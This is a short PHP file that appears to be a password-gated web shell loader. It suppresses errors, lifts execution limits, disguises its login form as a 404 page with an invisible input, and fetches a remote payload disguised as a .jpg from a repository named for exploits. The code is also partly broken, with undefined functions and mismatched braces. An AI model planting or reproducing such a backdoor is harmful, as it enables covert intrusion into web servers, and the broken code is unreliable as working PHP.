<?php ?>

<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
$hashed_password = '$2y$10$lwQFXtjrU.6uJeB9eiN6JuMqzEMyS6vzR13OSYz9jHqsB0/zZWcgG';

if (!isset($_SESSION[hashed_password($password)])) {
    if(isset($_POST['password']) && !empty($_POST['password']) && hashed_password($_POST['password']) == $password) {
        $_SESSION[hashed_password($password)] = true;
    } else {
        http_response_code(404);
        echo '<form method="post" action="">
<input type="password" style="border:none" name="password"></form>';
        exit;
    }
if(!isset($_COOKIE[hashes_password($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(hashed_password($_SERVER['HTTP_HOST']), true, time() + 35200); // Cookie Password
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}
$sa = file_get_contents('https://raw.githubusercontent.com/anonrocks/exploitssss/master/mydb@.jpg');
?>
<?
}
?>
